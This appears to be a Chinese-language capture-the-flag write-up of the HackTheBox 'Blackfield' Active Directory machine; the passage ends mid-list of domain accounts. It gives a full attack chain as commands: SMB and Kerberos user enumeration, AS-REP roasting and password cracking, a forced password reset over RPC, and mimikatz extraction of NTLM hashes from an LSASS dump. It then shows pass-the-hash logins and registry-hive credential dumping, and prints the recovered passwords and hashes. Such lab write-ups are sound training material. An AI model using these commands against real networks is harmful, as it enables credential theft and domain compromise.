# blackfield

## 主机发现

```
10.10.10.192
sudo masscan -p1-65535 10.10.10.192 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports 10.10.10.192
nmap 10.10.10.192 --script=vuln
nmap 10.10.10.192 -sU --top-ports 20 -Pn
```

![image](https://github.com/user-attachments/assets/4dbc077f-33c1-4d12-a789-fc630def9f8a)


![image](https://github.com/user-attachments/assets/6f225420-120b-4151-a3a6-416ea9740371)


```
10.10.10.192 BLACKFIELD.local
```



## smb探索

```
smbclient -L //10.10.10.192/
```

![image](https://github.com/user-attachments/assets/9feaf9e1-af71-4dcf-b9f3-41f1d304e8e4)


```
smbclient //10.10.10.192/forensic
smbclient //10.10.10.192/profiles$
```

发现profiles里存了用户名目录，但是目录都是空的

```
  AAlleni                             D        0  Thu Jun  4 00:47:11 2020
  ABarteski                           D        0  Thu Jun  4 00:47:11 2020
  ABekesz                             D        0  Thu Jun  4 00:47:11 2020
  ABenzies                            D        0  Thu Jun  4 00:47:11 2020
  ABiemiller                          D        0  Thu Jun  4 00:47:11 2020
  AChampken                           D        0  Thu Jun  4 00:47:11 2020
  ACheretei                           D        0  Thu Jun  4 00:47:11 2020
  ACsonaki                            D        0  Thu Jun  4 00:47:11 2020
  AHigchens                           D        0  Thu Jun  4 00:47:11 2020
  AJaquemai                           D        0  Thu Jun  4 00:47:11 2020
  AKlado                              D        0  Thu Jun  4 00:47:11 2020
  AKoffenburger                       D        0  Thu Jun  4 00:47:11 2020
  AKollolli                           D        0  Thu Jun  4 00:47:11 2020
  AKruppe                             D        0  Thu Jun  4 00:47:11 2020
  AKubale                             D        0  Thu Jun  4 00:47:11 2020
  ALamerz                             D        0  Thu Jun  4 00:47:11 2020
  AMaceldon                           D        0  Thu Jun  4 00:47:11 2020
  AMasalunga                          D        0  Thu Jun  4 00:47:11 2020
  ANavay                              D        0  Thu Jun  4 00:47:11 2020
  ANesterova                          D        0  Thu Jun  4 00:47:11 2020
  ANeusse                             D        0  Thu Jun  4 00:47:11 2020
  AOkleshen                           D        0  Thu Jun  4 00:47:11 2020
  APustulka                           D        0  Thu Jun  4 00:47:11 2020
  ARotella                            D        0  Thu Jun  4 00:47:11 2020
  ASanwardeker                        D        0  Thu Jun  4 00:47:11 2020
  AShadaia                            D        0  Thu Jun  4 00:47:11 2020
  ASischo                             D        0  Thu Jun  4 00:47:11 2020
  ASpruce                             D        0  Thu Jun  4 00:47:11 2020
  ATakach                             D        0  Thu Jun  4 00:47:11 2020
  ATaueg                              D        0  Thu Jun  4 00:47:11 2020
  ATwardowski                         D        0  Thu Jun  4 00:47:11 2020
  audit2020                           D        0  Thu Jun  4 00:47:11 2020
  AWangenheim                         D        0  Thu Jun  4 00:47:11 2020
  AWorsey                             D        0  Thu Jun  4 00:47:11 2020
  AZigmunt                            D        0  Thu Jun  4 00:47:11 2020
  BBakajza                            D        0  Thu Jun  4 00:47:11 2020
  BBeloucif                           D        0  Thu Jun  4 00:47:11 2020
  BCarmitcheal                        D        0  Thu Jun  4 00:47:11 2020
  BConsultant                         D        0  Thu Jun  4 00:47:11 2020
  BErdossy                            D        0  Thu Jun  4 00:47:11 2020
  BGeminski                           D        0  Thu Jun  4 00:47:11 2020
  BLostal                             D        0  Thu Jun  4 00:47:11 2020
  BMannise                            D        0  Thu Jun  4 00:47:11 2020
  BNovrotsky                          D        0  Thu Jun  4 00:47:11 2020
  BRigiero                            D        0  Thu Jun  4 00:47:11 2020
  BSamkoses                           D        0  Thu Jun  4 00:47:11 2020
  BZandonella                         D        0  Thu Jun  4 00:47:11 2020
  CAcherman                           D        0  Thu Jun  4 00:47:12 2020
  CAkbari                             D        0  Thu Jun  4 00:47:12 2020
  CAldhowaihi                         D        0  Thu Jun  4 00:47:12 2020
  CArgyropolous                       D        0  Thu Jun  4 00:47:12 2020
  CDufrasne                           D        0  Thu Jun  4 00:47:12 2020
  CGronk                              D        0  Thu Jun  4 00:47:11 2020
  Chiucarello                         D        0  Thu Jun  4 00:47:11 2020
  Chiuccariello                       D        0  Thu Jun  4 00:47:12 2020
  CHoytal                             D        0  Thu Jun  4 00:47:12 2020
  CKijauskas                          D        0  Thu Jun  4 00:47:12 2020
  CKolbo                              D        0  Thu Jun  4 00:47:12 2020
  CMakutenas                          D        0  Thu Jun  4 00:47:12 2020
  CMorcillo                           D        0  Thu Jun  4 00:47:11 2020
  CSchandall                          D        0  Thu Jun  4 00:47:12 2020
  CSelters                            D        0  Thu Jun  4 00:47:12 2020
  CTolmie                             D        0  Thu Jun  4 00:47:12 2020
  DCecere                             D        0  Thu Jun  4 00:47:12 2020
  DChintalapalli                      D        0  Thu Jun  4 00:47:12 2020
  DCwilich                            D        0  Thu Jun  4 00:47:12 2020
  DGarbatiuc                          D        0  Thu Jun  4 00:47:12 2020
  DKemesies                           D        0  Thu Jun  4 00:47:12 2020
  DMatuka                             D        0  Thu Jun  4 00:47:12 2020
  DMedeme                             D        0  Thu Jun  4 00:47:12 2020
  DMeherek                            D        0  Thu Jun  4 00:47:12 2020
  DMetych                             D        0  Thu Jun  4 00:47:12 2020
  DPaskalev                           D        0  Thu Jun  4 00:47:12 2020
  DPriporov                           D        0  Thu Jun  4 00:47:12 2020
  DRusanovskaya                       D        0  Thu Jun  4 00:47:12 2020
  DVellela                            D        0  Thu Jun  4 00:47:12 2020
  DVogleson                           D        0  Thu Jun  4 00:47:12 2020
  DZwinak                             D        0  Thu Jun  4 00:47:12 2020
  EBoley                              D        0  Thu Jun  4 00:47:12 2020
  EEulau                              D        0  Thu Jun  4 00:47:12 2020
  EFeatherling                        D        0  Thu Jun  4 00:47:12 2020
  EFrixione                           D        0  Thu Jun  4 00:47:12 2020
  EJenorik                            D        0  Thu Jun  4 00:47:12 2020
  EKmilanovic                         D        0  Thu Jun  4 00:47:12 2020
  ElKatkowsky                         D        0  Thu Jun  4 00:47:12 2020
  EmaCaratenuto                       D        0  Thu Jun  4 00:47:12 2020
  EPalislamovic                       D        0  Thu Jun  4 00:47:12 2020
  EPryar                              D        0  Thu Jun  4 00:47:12 2020
  ESachhitello                        D        0  Thu Jun  4 00:47:12 2020
  ESariotti                           D        0  Thu Jun  4 00:47:12 2020
  ETurgano                            D        0  Thu Jun  4 00:47:12 2020
  EWojtila                            D        0  Thu Jun  4 00:47:12 2020
  FAlirezai                           D        0  Thu Jun  4 00:47:12 2020
  FBaldwind                           D        0  Thu Jun  4 00:47:12 2020
  FBroj                               D        0  Thu Jun  4 00:47:12 2020
  FDeblaquire                         D        0  Thu Jun  4 00:47:12 2020
  FDegeorgio                          D        0  Thu Jun  4 00:47:12 2020
  FianLaginja                         D        0  Thu Jun  4 00:47:12 2020
  FLasokowski                         D        0  Thu Jun  4 00:47:12 2020
  FPflum                              D        0  Thu Jun  4 00:47:12 2020
  FReffey                             D        0  Thu Jun  4 00:47:12 2020
  GaBelithe                           D        0  Thu Jun  4 00:47:12 2020
  Gareld                              D        0  Thu Jun  4 00:47:12 2020
  GBatowski                           D        0  Thu Jun  4 00:47:12 2020
  GForshalger                         D        0  Thu Jun  4 00:47:12 2020
  GGomane                             D        0  Thu Jun  4 00:47:12 2020
  GHisek                              D        0  Thu Jun  4 00:47:12 2020
  GMaroufkhani                        D        0  Thu Jun  4 00:47:12 2020
  GMerewether                         D        0  Thu Jun  4 00:47:12 2020
  GQuinniey                           D        0  Thu Jun  4 00:47:12 2020
  GRoswurm                            D        0  Thu Jun  4 00:47:12 2020
  GWiegard                            D        0  Thu Jun  4 00:47:12 2020
  HBlaziewske                         D        0  Thu Jun  4 00:47:12 2020
  HColantino                          D        0  Thu Jun  4 00:47:12 2020
  HConforto                           D        0  Thu Jun  4 00:47:12 2020
  HCunnally                           D        0  Thu Jun  4 00:47:12 2020
  HGougen                             D        0  Thu Jun  4 00:47:12 2020
  HKostova                            D        0  Thu Jun  4 00:47:12 2020
  IChristijr                          D        0  Thu Jun  4 00:47:12 2020
  IKoledo                             D        0  Thu Jun  4 00:47:12 2020
  IKotecky                            D        0  Thu Jun  4 00:47:12 2020
  ISantosi                            D        0  Thu Jun  4 00:47:12 2020
  JAngvall                            D        0  Thu Jun  4 00:47:12 2020
  JBehmoiras                          D        0  Thu Jun  4 00:47:12 2020
  JDanten                             D        0  Thu Jun  4 00:47:12 2020
  JDjouka                             D        0  Thu Jun  4 00:47:12 2020
  JKondziola                          D        0  Thu Jun  4 00:47:12 2020
  JLeytushsenior                      D        0  Thu Jun  4 00:47:12 2020
  JLuthner                            D        0  Thu Jun  4 00:47:12 2020
  JMoorehendrickson                   D        0  Thu Jun  4 00:47:12 2020
  JPistachio                          D        0  Thu Jun  4 00:47:12 2020
  JScima                              D        0  Thu Jun  4 00:47:12 2020
  JSebaali                            D        0  Thu Jun  4 00:47:12 2020
  JShoenherr                          D        0  Thu Jun  4 00:47:12 2020
  JShuselvt                           D        0  Thu Jun  4 00:47:12 2020
  KAmavisca                           D        0  Thu Jun  4 00:47:12 2020
  KAtolikian                          D        0  Thu Jun  4 00:47:12 2020
  KBrokinn                            D        0  Thu Jun  4 00:47:12 2020
  KCockeril                           D        0  Thu Jun  4 00:47:12 2020
  KColtart                            D        0  Thu Jun  4 00:47:12 2020
  KCyster                             D        0  Thu Jun  4 00:47:12 2020
  KDorney                             D        0  Thu Jun  4 00:47:12 2020
  KKoesno                             D        0  Thu Jun  4 00:47:12 2020
  KLangfur                            D        0  Thu Jun  4 00:47:12 2020
  KMahalik                            D        0  Thu Jun  4 00:47:12 2020
  KMasloch                            D        0  Thu Jun  4 00:47:12 2020
  KMibach                             D        0  Thu Jun  4 00:47:12 2020
  KParvankova                         D        0  Thu Jun  4 00:47:12 2020
  KPregnolato                         D        0  Thu Jun  4 00:47:12 2020
  KRasmor                             D        0  Thu Jun  4 00:47:12 2020
  KShievitz                           D        0  Thu Jun  4 00:47:12 2020
  KSojdelius                          D        0  Thu Jun  4 00:47:12 2020
  KTambourgi                          D        0  Thu Jun  4 00:47:12 2020
  KVlahopoulos                        D        0  Thu Jun  4 00:47:12 2020
  KZyballa                            D        0  Thu Jun  4 00:47:12 2020
  LBajewsky                           D        0  Thu Jun  4 00:47:12 2020
  LBaligand                           D        0  Thu Jun  4 00:47:12 2020
  LBarhamand                          D        0  Thu Jun  4 00:47:12 2020
  LBirer                              D        0  Thu Jun  4 00:47:12 2020
  LBobelis                            D        0  Thu Jun  4 00:47:12 2020
  LChippel                            D        0  Thu Jun  4 00:47:12 2020
  LChoffin                            D        0  Thu Jun  4 00:47:12 2020
  LCominelli                          D        0  Thu Jun  4 00:47:12 2020
  LDruge                              D        0  Thu Jun  4 00:47:12 2020
  LEzepek                             D        0  Thu Jun  4 00:47:12 2020
  LHyungkim                           D        0  Thu Jun  4 00:47:12 2020
  LKarabag                            D        0  Thu Jun  4 00:47:12 2020
  LKirousis                           D        0  Thu Jun  4 00:47:12 2020
  LKnade                              D        0  Thu Jun  4 00:47:12 2020
  LKrioua                             D        0  Thu Jun  4 00:47:12 2020
  LLefebvre                           D        0  Thu Jun  4 00:47:12 2020
  LLoeradeavilez                      D        0  Thu Jun  4 00:47:12 2020
  LMichoud                            D        0  Thu Jun  4 00:47:12 2020
  LTindall                            D        0  Thu Jun  4 00:47:12 2020
  LYturbe                             D        0  Thu Jun  4 00:47:12 2020
  MArcynski                           D        0  Thu Jun  4 00:47:12 2020
  MAthilakshmi                        D        0  Thu Jun  4 00:47:12 2020
  MAttravanam                         D        0  Thu Jun  4 00:47:12 2020
  MBrambini                           D        0  Thu Jun  4 00:47:12 2020
  MHatziantoniou                      D        0  Thu Jun  4 00:47:12 2020
  MHoerauf                            D        0  Thu Jun  4 00:47:12 2020
  MKermarrec                          D        0  Thu Jun  4 00:47:12 2020
  MKillberg                           D        0  Thu Jun  4 00:47:12 2020
  MLapesh                             D        0  Thu Jun  4 00:47:12 2020
  MMakhsous                           D        0  Thu Jun  4 00:47:12 2020
  MMerezio                            D        0  Thu Jun  4 00:47:12 2020
  MNaciri                             D        0  Thu Jun  4 00:47:12 2020
  MShanmugarajah                      D        0  Thu Jun  4 00:47:12 2020
  MSichkar                            D        0  Thu Jun  4 00:47:12 2020
  MTemko                              D        0  Thu Jun  4 00:47:12 2020
  MTipirneni                          D        0  Thu Jun  4 00:47:12 2020
  MTonuri                             D        0  Thu Jun  4 00:47:12 2020
  MVanarsdel                          D        0  Thu Jun  4 00:47:12 2020
  NBellibas                           D        0  Thu Jun  4 00:47:12 2020
  NDikoka                             D        0  Thu Jun  4 00:47:12 2020
  NGenevro                            D        0  Thu Jun  4 00:47:12 2020
  NGoddanti                           D        0  Thu Jun  4 00:47:12 2020
  NMrdirk                             D        0  Thu Jun  4 00:47:12 2020
  NPulido                             D        0  Thu Jun  4 00:47:12 2020
  NRonges                             D        0  Thu Jun  4 00:47:12 2020
  NSchepkie                           D        0  Thu Jun  4 00:47:12 2020
  NVanpraet                           D        0  Thu Jun  4 00:47:12 2020
  OBelghazi                           D        0  Thu Jun  4 00:47:12 2020
  OBushey                             D        0  Thu Jun  4 00:47:12 2020
  OHardybala                          D        0  Thu Jun  4 00:47:12 2020
  OLunas                              D        0  Thu Jun  4 00:47:12 2020
  ORbabka                             D        0  Thu Jun  4 00:47:12 2020
  PBourrat                            D        0  Thu Jun  4 00:47:12 2020
  PBozzelle                           D        0  Thu Jun  4 00:47:12 2020
  PBranti                             D        0  Thu Jun  4 00:47:12 2020
  PCapperella                         D        0  Thu Jun  4 00:47:12 2020
  PCurtz                              D        0  Thu Jun  4 00:47:12 2020
  PDoreste                            D        0  Thu Jun  4 00:47:12 2020
  PGegnas                             D        0  Thu Jun  4 00:47:12 2020
  PMasulla                            D        0  Thu Jun  4 00:47:12 2020
  PMendlinger                         D        0  Thu Jun  4 00:47:12 2020
  PParakat                            D        0  Thu Jun  4 00:47:12 2020
  PProvencer                          D        0  Thu Jun  4 00:47:12 2020
  PTesik                              D        0  Thu Jun  4 00:47:12 2020
  PVinkovich                          D        0  Thu Jun  4 00:47:12 2020
  PVirding                            D        0  Thu Jun  4 00:47:12 2020
  PWeinkaus                           D        0  Thu Jun  4 00:47:12 2020
  RBaliukonis                         D        0  Thu Jun  4 00:47:12 2020
  RBochare                            D        0  Thu Jun  4 00:47:12 2020
  RKrnjaic                            D        0  Thu Jun  4 00:47:12 2020
  RNemnich                            D        0  Thu Jun  4 00:47:12 2020
  RPoretsky                           D        0  Thu Jun  4 00:47:12 2020
  RStuehringer                        D        0  Thu Jun  4 00:47:12 2020
  RSzewczuga                          D        0  Thu Jun  4 00:47:12 2020
  RVallandas                          D        0  Thu Jun  4 00:47:12 2020
  RWeatherl                           D        0  Thu Jun  4 00:47:12 2020
  RWissor                             D        0  Thu Jun  4 00:47:12 2020
  SAbdulagatov                        D        0  Thu Jun  4 00:47:12 2020
  SAjowi                              D        0  Thu Jun  4 00:47:12 2020
  SAlguwaihes                         D        0  Thu Jun  4 00:47:12 2020
  SBonaparte                          D        0  Thu Jun  4 00:47:12 2020
  SBouzane                            D        0  Thu Jun  4 00:47:12 2020
  SChatin                             D        0  Thu Jun  4 00:47:12 2020
  SDellabitta                         D        0  Thu Jun  4 00:47:12 2020
  SDhodapkar                          D        0  Thu Jun  4 00:47:12 2020
  SEulert                             D        0  Thu Jun  4 00:47:12 2020
  SFadrigalan                         D        0  Thu Jun  4 00:47:12 2020
  SGolds                              D        0  Thu Jun  4 00:47:12 2020
  SGrifasi                            D        0  Thu Jun  4 00:47:12 2020
  SGtlinas                            D        0  Thu Jun  4 00:47:12 2020
  SHauht                              D        0  Thu Jun  4 00:47:12 2020
  SHederian                           D        0  Thu Jun  4 00:47:12 2020
  SHelregel                           D        0  Thu Jun  4 00:47:12 2020
  SKrulig                             D        0  Thu Jun  4 00:47:12 2020
  SLewrie                             D        0  Thu Jun  4 00:47:12 2020
  SMaskil                             D        0  Thu Jun  4 00:47:12 2020
  Smocker                             D        0  Thu Jun  4 00:47:12 2020
  SMoyta                              D        0  Thu Jun  4 00:47:12 2020
  SRaustiala                          D        0  Thu Jun  4 00:47:12 2020
  SReppond                            D        0  Thu Jun  4 00:47:12 2020
  SSicliano                           D        0  Thu Jun  4 00:47:12 2020
  SSilex                              D        0  Thu Jun  4 00:47:12 2020
  SSolsbak                            D        0  Thu Jun  4 00:47:12 2020
  STousignaut                         D        0  Thu Jun  4 00:47:12 2020
  support                             D        0  Thu Jun  4 00:47:12 2020
  svc_backup                          D        0  Thu Jun  4 00:47:12 2020
  SWhyte                              D        0  Thu Jun  4 00:47:12 2020
  SWynigear                           D        0  Thu Jun  4 00:47:12 2020
  TAwaysheh                           D        0  Thu Jun  4 00:47:12 2020
  TBadenbach                          D        0  Thu Jun  4 00:47:12 2020
  TCaffo                              D        0  Thu Jun  4 00:47:12 2020
  TCassalom                           D        0  Thu Jun  4 00:47:12 2020
  TEiselt                             D        0  Thu Jun  4 00:47:12 2020
  TFerencdo                           D        0  Thu Jun  4 00:47:12 2020
  TGaleazza                           D        0  Thu Jun  4 00:47:12 2020
  TKauten                             D        0  Thu Jun  4 00:47:12 2020
  TKnupke                             D        0  Thu Jun  4 00:47:12 2020
  TLintlop                            D        0  Thu Jun  4 00:47:12 2020
  TMusselli                           D        0  Thu Jun  4 00:47:12 2020
  TOust                               D        0  Thu Jun  4 00:47:12 2020
  TSlupka                             D        0  Thu Jun  4 00:47:12 2020
  TStausland                          D        0  Thu Jun  4 00:47:12 2020
  TZumpella                           D        0  Thu Jun  4 00:47:12 2020
  UCrofskey                           D        0  Thu Jun  4 00:47:12 2020
  UMarylebone                         D        0  Thu Jun  4 00:47:12 2020
  UPyrke                              D        0  Thu Jun  4 00:47:12 2020
  VBublavy                            D        0  Thu Jun  4 00:47:12 2020
  VButziger                           D        0  Thu Jun  4 00:47:12 2020
  VFuscca                             D        0  Thu Jun  4 00:47:12 2020
  VLitschauer                         D        0  Thu Jun  4 00:47:12 2020
  VMamchuk                            D        0  Thu Jun  4 00:47:12 2020
  VMarija                             D        0  Thu Jun  4 00:47:12 2020
  VOlaosun                            D        0  Thu Jun  4 00:47:12 2020
  VPapalouca                          D        0  Thu Jun  4 00:47:12 2020
  WSaldat                             D        0  Thu Jun  4 00:47:12 2020
  WVerzhbytska                        D        0  Thu Jun  4 00:47:12 2020
  WZelazny                            D        0  Thu Jun  4 00:47:12 2020
  XBemelen                            D        0  Thu Jun  4 00:47:12 2020
  XDadant                             D        0  Thu Jun  4 00:47:12 2020
  XDebes                              D        0  Thu Jun  4 00:47:12 2020
  XKonegni                            D        0  Thu Jun  4 00:47:12 2020
  XRykiel                             D        0  Thu Jun  4 00:47:12 2020
  YBleasdale                          D        0  Thu Jun  4 00:47:12 2020
  YHuftalin                           D        0  Thu Jun  4 00:47:12 2020
  YKivlen                             D        0  Thu Jun  4 00:47:12 2020
  YKozlicki                           D        0  Thu Jun  4 00:47:12 2020
  YNyirenda                           D        0  Thu Jun  4 00:47:12 2020
  YPredestin                          D        0  Thu Jun  4 00:47:12 2020
  YSeturino                           D        0  Thu Jun  4 00:47:12 2020
  YSkoropada                          D        0  Thu Jun  4 00:47:12 2020
  YVonebers                           D        0  Thu Jun  4 00:47:12 2020
  YZarpentine                         D        0  Thu Jun  4 00:47:12 2020
  ZAlatti                             D        0  Thu Jun  4 00:47:12 2020
  ZKrenselewski                       D        0  Thu Jun  4 00:47:12 2020
  ZMalaab                             D        0  Thu Jun  4 00:47:12 2020
  ZMiick                              D        0  Thu Jun  4 00:47:12 2020
  ZScozzari                           D        0  Thu Jun  4 00:47:12 2020
  ZTimofeeff                          D        0  Thu Jun  4 00:47:12 2020
  ZWausik                             D        0  Thu Jun  4 00:47:12 2020
```

也许可以尝试Roasting和用户枚举

```
cat userget | awk -F' ' "{print \$1}"  > user 
./kerbrute_linux_386 userenum --dc 10.10.10.192 -d BLACKFIELD.local user
GetNPUsers.py -no-pass -dc-ip 10.10.10.192 BLACKFIELD.local/ -usersfile dcuser
```

![image](https://github.com/user-attachments/assets/e7a77266-8ad8-4ceb-81b5-7914320a3354)


![image](https://github.com/user-attachments/assets/aead709f-c47a-4718-98d0-733dd239f682)

support可以roasting攻击，尝试破解hash

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20241127193312416](E:\渗透学习\知识\语雀\assets\image-20241127193312416.png)

```
#00^BlackKnight
```

winrm登录

```
crackmapexec smb BLACKFIELD.local -u support -p '#00^BlackKnight'
evil-winrm -i 10.10.10.192 -u "support" -p '#00^BlackKnight'
```

![image](https://github.com/user-attachments/assets/218be588-ffd3-4616-82f8-07230c935ea7)


![image](https://github.com/user-attachments/assets/cf10dd57-9234-47b8-8945-d4a53c55dce2)


失败了，smb登登看

```
smbclient -L //10.10.10.192/ -U "support"
#00^BlackKnight
```

![image](https://github.com/user-attachments/assets/b620cb50-ea24-4f6f-ab29-0f095246fd05)


```
smbclient //10.10.10.192/forensic -U "support"
smbclient //10.10.10.192/profiles$ -U "support"
```

![image](https://github.com/user-attachments/assets/02b7ed5f-ab02-4d7b-af3c-e38b7baf8290)


profiles也没啥，看看别的吧

```
psexec.py support:#00^BlackKnight@10.10.10.192
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d BLACKFIELD.local -dc BLACKFIELD.local -ns 10.10.10.192 --zip
```

![image](https://github.com/user-attachments/assets/be835bb2-a9fa-4527-bc50-0a73fd169255)

可以看到remote只有SVC_BACKUP可以登录

![image](https://github.com/user-attachments/assets/f7c52d5e-2ee2-4cef-ba6b-1e00d33c3c4a)


ok，又可以拿到一个用户，既然不能登录，看看能不能rpc登录修改密码

```
rpcclient -U 'support' 10.10.10.192
登录rpc
setuserinfo2 AUDIT2020 23 '0xptS3@'
修改密码

crackmapexec smb BLACKFIELD.local -u AUDIT2020 -p '0xptS3@'
```

![image](https://github.com/user-attachments/assets/558b0ca6-812c-4eee-871d-8e639c2f83c4)


![image](https://github.com/user-attachments/assets/24ed49ef-9821-4cd6-90a8-765967f59a73)


成功了，尝试登登winrm，尽管不属于remote组

```
evil-winrm -i 10.10.10.192 -u "AUDIT2020" -p '0xptS3@'
smbclient -L //10.10.10.192/ -U "AUDIT2020"
smbclient //10.10.10.192/forensic -U "AUDIT2020"
smbclient //10.10.10.192/profiles$ -U "support"
psexec.py AUDIT2020:0xptS3\@@10.10.10.192
```

![image](https://github.com/user-attachments/assets/62a9b272-912a-4869-a1ca-93fe746272df)


![image](https://github.com/user-attachments/assets/479d586a-0acf-40a1-a5d4-371ae5fa938c)


![image](https://github.com/user-attachments/assets/d724e0ba-349e-4d09-b5dc-e0658364c4f7)


这次有权限看forensic了，我们看看

![image](https://github.com/user-attachments/assets/e7240704-58c4-4bbf-94c6-6508fc2df889)


get下来看看这部分

![image](https://github.com/user-attachments/assets/ab264811-1dc8-4e43-8b10-bf2e97b223af)


```
Ipwn3dYourCompany
Administrator
```

![image](https://github.com/user-attachments/assets/e3c74c2f-9b65-418e-8d96-a8b3169282eb)


太多了，我们接着看看memory_analysis下的

![image](https://github.com/user-attachments/assets/4d0ba23c-ce8e-4646-8019-dd6c6f081e3f)


看看lsass.zip

![image](https://github.com/user-attachments/assets/83b93521-d51a-4523-b41d-e59a5ed7754a)


![image](https://github.com/user-attachments/assets/43bfffa2-aee0-4e97-b456-f2dbb14e8b04)


猕猴桃打开dmp

https://abawazeeer.medium.com/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330

```
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP
mimikatz # sekurlsa::logonPasswords full
```

![image](https://github.com/user-attachments/assets/603a4427-57cc-4f15-b2bd-066122bd8f3b)


到此就可以进行PTH了

```
svc_backup
9658d1d1dcd9250115e2205d9f48400d
```

下面还有信息我们继续看

![image](https://github.com/user-attachments/assets/105d8d6f-f5b6-461c-bbe6-e559797b786a)


```
Administrator
7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

![image](https://github.com/user-attachments/assets/db31b56f-ade9-4bd6-9364-1d176dc83549)


```
DC01$
b624dc83a27cc29da11d9bf25efea796
```

不一定正确，但值得尝试

```
9658d1d1dcd9250115e2205d9f48400d

evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 -u svc_backup
```

![image](https://github.com/user-attachments/assets/a222c3ae-2035-46e7-ae24-bf8e9e2ca906)


成功

## 横向1

拿着别的htlm尝试下

![image](https://github.com/user-attachments/assets/03ea0936-b5f5-4afd-bf2c-a505e660cf76)


```
Administrator
7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

![image](https://github.com/user-attachments/assets/e167b297-aa69-4bdc-bc19-3f860c0d0f6d)


```
DC01$
b624dc83a27cc29da11d9bf25efea796
```

不一定正确，但值得尝试

```
crackmapexec.exe 10.10.10.192 -u DC01$ -H aada8eda23213c027743e6c498d751aa:b624dc83a27cc29da11d9bf25efea796
```

![image](https://github.com/user-attachments/assets/ad6cbc05-b244-4518-8b0c-082b653fec1a)


失败了，重新想办法吧

![image](https://github.com/user-attachments/assets/a068e57e-f5ce-4111-b8fb-5168b60f1579)


这个好像没啥用呀，继续收集

![image](https://github.com/user-attachments/assets/519a01a1-5371-4bfd-86af-94bda2f3ab46)


```
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

```
whoami /all
```

![image](https://github.com/user-attachments/assets/c9c9412f-a0e1-4567-9f8e-5d9bf49905dd)


可以尝试

```
reg save hklm\system C:\Users\svc_backup\documents\system.hive
reg save hklm\sam C:\Users\svc_backup\documents\sam.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

![image](https://github.com/user-attachments/assets/c4cd7331-b544-4150-b0b7-8542828d70dc)


![image](https://github.com/user-attachments/assets/5330b03d-959f-4f17-99dd-02257ba00a88)


![image](https://github.com/user-attachments/assets/9a80eb1a-4aca-4d65-8656-48b05699da83)


```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

crackmapexec smb 10.10.10.192 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051

psexec.py Administrator@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051
```

![image](https://github.com/user-attachments/assets/52d9c6d9-5941-4f79-85e2-58c2eca93288)


![image](https://github.com/user-attachments/assets/963b6151-fdd5-4b98-a01f-023c9690e0a9)


失败了，既然域内这么多用户，我们都拿出来碰撞下试试

```
Administrator                            BLACKFIELD103974
BLACKFIELD106360         BLACKFIELD107197         BLACKFIELD112766
BLACKFIELD114762         BLACKFIELD115148         BLACKFIELD118321
BLACKFIELD128775         BLACKFIELD129328         BLACKFIELD129387
BLACKFIELD131771         BLACKFIELD135403         BLACKFIELD135990
BLACKFIELD136203         BLACKFIELD136813         BLACKFIELD137694
BLACKFIELD146200         BLACKFIELD148067         BLACKFIELD150357
BLACKFIELD160610         BLACKFIELD160820         BLACKFIELD163183
BLACKFIELD169035         BLACKFIELD169876         BLACKFIELD171624
BLACKFIELD175204         BLACKFIELD184482         BLACKFIELD184493
BLACKFIELD186980         BLACKFIELD189208         BLACKFIELD191416
BLACKFIELD192642         BLACKFIELD194732         BLACKFIELD195757
BLACKFIELD195953         BLACKFIELD196444         BLACKFIELD198927
BLACKFIELD199889         BLACKFIELD201655         BLACKFIELD202900
BLACKFIELD204805         BLACKFIELD219324         BLACKFIELD219914
BLACKFIELD220786         BLACKFIELD224839         BLACKFIELD227380
BLACKFIELD228442         BLACKFIELD229506         BLACKFIELD230515
BLACKFIELD235930         BLACKFIELD236467         BLACKFIELD246388
BLACKFIELD247450         BLACKFIELD250576         BLACKFIELD251003
BLACKFIELD251977         BLACKFIELD252379         BLACKFIELD253047
BLACKFIELD253541         BLACKFIELD256791         BLACKFIELD266096
BLACKFIELD267457         BLACKFIELD268320         BLACKFIELD269538
BLACKFIELD274109         BLACKFIELD274367         BLACKFIELD274577
BLACKFIELD286615         BLACKFIELD289513         BLACKFIELD290325
BLACKFIELD290582         BLACKFIELD291678         BLACKFIELD307633
BLACKFIELD314351         BLACKFIELD315276         BLACKFIELD316850
BLACKFIELD318077         BLACKFIELD318250         BLACKFIELD319016
BLACKFIELD321206         BLACKFIELD327610         BLACKFIELD328983
BLACKFIELD329802         BLACKFIELD334058         BLACKFIELD336573
BLACKFIELD339143         BLACKFIELD348433         BLACKFIELD348835
BLACKFIELD350809         BLACKFIELD356727         BLACKFIELD357023
BLACKFIELD358090         BLACKFIELD359278         BLACKFIELD362337
BLACKFIELD371669         BLACKFIELD375924         BLACKFIELD382769
BLACKFIELD383108         BLACKFIELD385719         BLACKFIELD385928
BLACKFIELD390179         BLACKFIELD390192         BLACKFIELD395725
BLACKFIELD397679         BLACKFIELD402639         BLACKFIELD404213
BLACKFIELD404458         BLACKFIELD405242         BLACKFIELD410243
BLACKFIELD411132         BLACKFIELD411740         BLACKFIELD412798
BLACKFIELD413242         BLACKFIELD415829         BLACKFIELD416532
BLACKFIELD419600         BLACKFIELD428532         BLACKFIELD429587
BLACKFIELD430864         BLACKFIELD433476         BLACKFIELD434395
BLACKFIELD438814         BLACKFIELD438923         BLACKFIELD441593
